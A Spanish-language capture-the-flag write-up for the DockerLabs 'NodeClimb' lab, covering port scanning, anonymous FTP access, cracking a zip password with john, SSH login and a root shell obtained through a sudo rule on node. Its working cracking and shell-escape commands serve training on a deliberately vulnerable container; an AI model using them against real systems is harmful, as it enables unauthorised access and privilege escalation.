---
layout: post
title: NodeClimb
date: 2024.07.05
categories: [dockerlabs, ctf, linux, facil]
---

![image](/assets/images/node/node.png)

Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma [dockerlabs](https://dockerlabs.es/).

# Enumeración

Ponemos el docker en marcha con el `auto_deploy.sh` que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es `172.17.0.2`.

Empezamos realizando un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` a nuestra máquina victima `172.17.0.2`:

```bash
$ sudo nmap -sS -p- -Pn -n -v 172.17.0.2
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Vemos que solo tiene los puertos **21** y **22**  abiertos. Vamos a realizar otro escaneo con `nmap` pero esta vez para detectar la versión del servicio que este corriendo, `-sV`, y para ejecutar los scripts por defecto para detectar vulnerabilidades, `-sC`:

```bash
$ sudo nmap -sCV -p21,22 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
```

# Intrusión

Vemos que nos podemos conectar al servidor **ftp** como usuario *anónimo* y que además hay un fichero a nuestro alcance. Entramos como **ftp** y nos lo descargamos:

```bash
$ ftp ftp@172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8580|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
226 Directory send OK.
ftp> get secretitopicaron.zip
local: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode (|||49269|)
150 Opening BINARY mode data connection for secretitopicaron.zip (242 bytes).
100% |******************|   242        1.77 MiB/s    00:00 ETA
226 Transfer complete.
242 bytes received in 00:00 (183.76 KiB/s)
ftp> bye
221 Goodbye.
```

Intentamos descomprimirlo pero vemos que tiene una contraseña. Creamos el hash del fichero zip con **zip2john**: 

```bash
$ zip2john secretitopicaron.zip > zip.hash
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
```

Y después intentamos sacar la password del fichero zip:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (secretitopicaron.zip/password.txt)     
1g 0:00:00:00 DONE (2024-07-05 23:00) 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
```

En un segundo tenemos la clave, descomprimimos el fichero y la vemos:

```bash
$ cat password.txt 
mario:laKontraseñAmasmalotaHdelbarrioH
```

Nos conectamos al servidor **ssh** como *mario*:

```bash
$ ssh mario@172.17.0.2
mario@172.17.0.2's password: 
Linux 014bc8cff695 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
```

# Escalada de privilegios

Vemos que puede ejecutar como **root**:

```bash
mario@014bc8cff695:~$ sudo -l
Matching Defaults entries for mario on 014bc8cff695:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User mario may run the following commands on 014bc8cff695:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Puede ejecutar un script en node que esta vacio en el home de mario. Miramos a ver si hay algo en el historial de bash:

```bash
mario@014bc8cff695:~$ cat .bash_history 
sudo -l
sudo /usr/local/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' 
/usr/local/bin/node
locate node
apt install locate
exit
sudo -l
/usr/bin/node
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
exit
sudo -l
ls
exit
ls
whoami
sudo -l
cat script.js 
ls -l
exit

```

Curiosamente nos da una pista de cómo obtener la shell desde node. Añadimos al fichero **script.js** la función para la creación de una shell:

```bash
mario@014bc8cff695:~$ echo 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' > script.js
```

Y ejecutamos el comando con sudo:

```bash
$ sudo /usr/bin/node /home/mario/script.js# whoami;hostname;date
root
014bc8cff695
Fri Jul  5 21:14:24 UTC 2024
#
```

Con esto ya seriamos **root** en la máquina.

Un saludo